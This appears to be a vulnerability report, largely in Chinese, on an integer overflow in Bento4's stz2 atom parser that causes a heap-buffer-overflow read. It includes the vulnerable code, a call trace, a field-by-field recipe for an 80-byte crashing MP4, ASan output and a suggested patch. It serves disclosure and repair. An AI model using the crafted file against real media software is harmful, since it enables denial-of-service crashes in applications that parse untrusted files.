# VULN 001 – stz2 integer overflow → heap-buffer-overflow READ

## 状态
**VERIFIED_CRASH** – AddressSanitizer 确认 heap-buffer-overflow (READ)

## 漏洞原理

**文件**: `Bento4/Source/C++/Core/Ap4Stz2Atom.cpp` 第 88–120 行

```cpp
AP4_Cardinal sample_count = m_SampleCount;          // L88: 0x10000000
m_Entries.SetItemCount(sample_count);                // L89: 分配 0x10000000 个 uint32_t 条目

unsigned int table_size = (sample_count*m_FieldSize+7)/8; // L90: 关键溢出点
// sample_count=0x10000000, m_FieldSize=16
// 0x10000000 * 16 = 0x100000000  →  uint32_t 截断为 0x00000000
// table_size = (0 + 7) / 8 = 0

if ((table_size+8) > size) return;                   // L91: 0+8=8 <= 20，通过！

unsigned char* buffer = new unsigned char[table_size]; // L92: new char[0] → 1 字节（ASan 补齐）
stream.Read(buffer, table_size);                       // L93: 读取 0 字节

case 16:
    for (unsigned int i=0; i<sample_count; i++) {      // L116: 循环 0x10000000 次
        m_Entries[i] = AP4_BytesToUInt16BE(&buffer[i*2]); // L117: buffer[0..1] OOB READ
    }
```

## 溢出计算

| 字段 | 值 |
|------|-----|
| m_FieldSize | 16 |
| sample_count | 0x10000000 (268,435,456) |
| 乘积（uint32_t） | 0x100000000 → 截断为 **0** |
| table_size | (0 + 7) / 8 = **0** |
| 分配缓冲区大小 | `new char[0]` → 0/1 字节 |
| 循环读取 | buffer[0], buffer[1] → **越界** |

## 触发路径

```
main()
└── AP4_File(stream)
    └── ParseStream()
        └── AP4_AtomFactory::CreateAtomFromStream()   [moov/trak/mdia/minf/stbl 递归]
            └── AP4_Stz2Atom::Create(size=20, stream)
                └── new AP4_Stz2Atom(size=20, v=0, f=0, stream)
                    ├── m_Entries.SetItemCount(0x10000000)   [可能 OOM]
                    ├── table_size = 0                        [uint32_t 溢出]
                    ├── buffer = new char[0]
                    └── buffer[0..1] READ                     ← CRASH
```

## 构造方法

最小 MP4（80 字节）：
```
ftyp (20B): brand=mp42
moov (60B):
  trak (52B):
    mdia (44B):
      minf (36B):
        stbl (28B):
          stz2 (20B):  ← 恶意 atom
            size=20, type='stz2', version=0, flags=0
            reserved=\x00\x00\x00
            field_size=16
            sample_count=0x10000000
```

## ASan 输出摘要

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000091
READ of size 1 at 0x502000000091 thread T0
#0 AP4_Stz2Atom::AP4_Stz2Atom(...)  (Ap4Stz2Atom.cpp:117)
0x502000000091 is located 0 bytes to the right of
  1-byte region [0x502000000090,0x502000000091)
  allocated by operator new[](unsigned long) ← new unsigned char[0]
```

## 修复建议

在计算 `table_size` 前，使用 64 位中间变量防止溢出，并对结果做合法性检查：

```cpp
AP4_UI64 table_size64 = ((AP4_UI64)sample_count * m_FieldSize + 7) / 8;
if (table_size64 > 0xFFFFFFFF || (table_size64 + 8) > size) return;
unsigned int table_size = (unsigned int)table_size64;
```
